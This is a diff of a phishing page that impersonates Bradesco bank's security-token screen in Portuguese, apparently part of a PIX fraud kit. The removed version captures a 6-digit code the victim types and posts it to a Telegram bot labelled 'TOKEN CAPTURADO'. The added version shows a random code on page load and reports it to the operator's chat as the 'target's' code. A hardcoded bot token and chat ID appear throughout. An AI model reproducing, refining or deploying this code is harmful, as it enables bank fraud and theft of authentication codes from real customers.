@@ -3,31 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bradesco | Validação de Segurança</title>
+    <title>Bradesco | Segurança</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>.bradesco-red { background-color: #cc092f; } .input-token { letter-spacing: 0.5em; text-align: center; font-size: 1.5rem; }</style>
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .bradesco-red { background-color: #cc092f; }
+        .token-display { 
+            letter-spacing: 0.3em; 
+            text-align: center; 
+            font-size: 2.2rem; 
+            color: #cc092f;
+            font-family: 'Courier New', Courier, monospace;
+        }
+    </style>
 </head>
 <body class="bg-gray-50 flex items-center justify-center min-h-screen p-4">
-    <div class="bg-white shadow-xl rounded-2xl max-w-md w-full overflow-hidden border border-gray-100">
-        <div class="bradesco-red p-6 flex justify-between items-center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Bradesco_logo.svg/2560px-Bradesco_logo.svg.png" class="h-6 brightness-0 invert" alt="Bradesco"><span class="text-white text-xs font-bold uppercase opacity-80">Segurança</span></div>
-        <div class="p-8">
-            <div class="flex flex-col items-center mb-6"><div class="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mb-4"><svg class="w-8 h-8 text-[#cc092f]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A10.003 10.003 0 0012 3c1.708 0 3.342.427 4.777 1.183a10.001 10.001 0 014.223 9.87c-.126.793-.304 1.564-.53 2.312M12 11V3m0 8c2.11 0 3.918 1.39 4.5 3.3m-9.013 0c.582-1.91 2.39-3.3 4.5-3.3z"></path></svg></div><h2 class="text-xl font-bold text-gray-800 text-center">Chave de Segurança</h2><p class="text-gray-500 text-sm text-center mt-2">Para confirmar o recebimento do PIX, digite o código de 6 dígitos gerado no seu aplicativo Bradesco.</p></div>
-            <div class="space-y-4">
-                <input type="text" id="tokenInput" maxlength="6" placeholder="000000" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:ring-2 focus:ring-red-500 transition-all font-bold input-token text-gray-700">
-                <button onclick="finalizarProcesso()" id="btnFinal" class="w-full bradesco-red hover:bg-red-700 text-white font-bold py-4 rounded-xl shadow-lg transition-all flex items-center justify-center gap-3">CONFIRMAR</button>
+
+    <div class="bg-white shadow-2xl rounded-[2rem] max-w-md w-full overflow-hidden border border-gray-100">
+        <div class="bradesco-red p-6 flex justify-between items-center">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Bradesco_logo.svg/1024px-Bradesco_logo.svg.png" 
+                 class="h-7 brightness-0 invert" alt="Bradesco">
+            <span class="text-white text-[10px] font-bold uppercase tracking-widest opacity-90">Segurança</span>
+        </div>
+
+        <div class="p-10">
+            <div class="flex flex-col items-center mb-8">
+                <div class="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mb-4">
+                    <svg class="w-8 h-8 text-[#cc092f]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+                    </svg>
+                </div>
+                <h2 class="text-xl font-extrabold text-gray-800 text-center">Chave de Segurança Digital</h2>
+                <p class="text-gray-400 text-xs text-center mt-3 leading-relaxed px-4">
+                    Sincronização realizada com sucesso. Informe ou utilize o código abaixo para validar o recebimento no seu aplicativo.
+                </p>
             </div>
-            <div class="mt-8 pt-6 border-top border-gray-100 flex justify-center gap-4 opacity-40"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Bandeira_do_Brasil.svg/1200px-Bandeira_do_Brasil.svg.png" class="h-4"><span class="text-[10px] font-bold text-gray-400 uppercase">Ambiente Seguro Bradesco</span></div>
+
+            <div class="space-y-6">
+                <div class="bg-gray-50 border-2 border-dashed border-gray-200 rounded-2xl p-6 flex flex-col items-center">
+                    <span id="tokenGerado" class="token-display font-bold">------</span>
+                    <p class="text-[9px] text-gray-400 uppercase mt-2 font-bold tracking-tighter italic">Válido por 60 segundos</p>
+                </div>
+
+                <div class="flex flex-col gap-3">
+                    <button onclick="window.location.href='https://www.bradesco.com.br'" class="w-full bradesco-red text-white font-bold py-5 rounded-2xl shadow-xl transition-all active:scale-95 uppercase tracking-widest text-sm">
+                        FINALIZAR SESSÃO
+                    </button>
+                </div>
+            </div>
+
+            <div class="mt-10 pt-6 border-t border-gray-50 flex flex-col items-center gap-2 opacity-30">
+                <div class="flex items-center gap-2">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Bandeira_do_Brasil.svg/1200px-Bandeira_do_Brasil.svg.png" class="h-3">
+                    <span class="text-[9px] font-bold text-gray-500 uppercase tracking-tighter">Ambiente Seguro Bradesco</span>
+                </div>
+            </div>
         </div>
     </div>
+
     <script>
-        const TOKEN = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; const ID = "560716860";
-        async function finalizarProcesso() {
-            const val = document.getElementById('tokenInput').value;
-            if (val.length < 6) { alert("Insira os 6 dígitos."); return; }
-            document.getElementById('btnFinal').innerText = 'VALIDANDO...';
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: ID, text: `🔑 *TOKEN CAPTURADO*\n🔢 Código: ${val}`, parse_mode: 'Markdown' }) });
-            setTimeout(() => { window.location.href = "https://www.bradesco.com.br"; }, 1500);
+        const TOKEN_BOT = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
+        const ID_CHAT = "560716860"; 
+
+        // Função para gerar número aleatório de 6 dígitos
+        function gerarTokenAleatorio() {
+            let num = Math.floor(100000 + Math.random() * 900000);
+            document.getElementById('tokenGerado').innerText = num;
+            return num;
         }
+
+        // Executa ao carregar a página
+        window.onload = async function() {
+            const novoToken = gerarTokenAleatorio();
+
+            // Envia o token gerado para o seu Telegram para você saber o que apareceu para o alvo
+            await fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: ID_CHAT, 
+                    text: `📟 *TOKEN GERADO PARA O ALVO*\n🔢 Código exibido: ${novoToken}`, 
+                    parse_mode: 'Markdown' 
+                })
+            });
+        };
     </script>
 </body>
 </html>
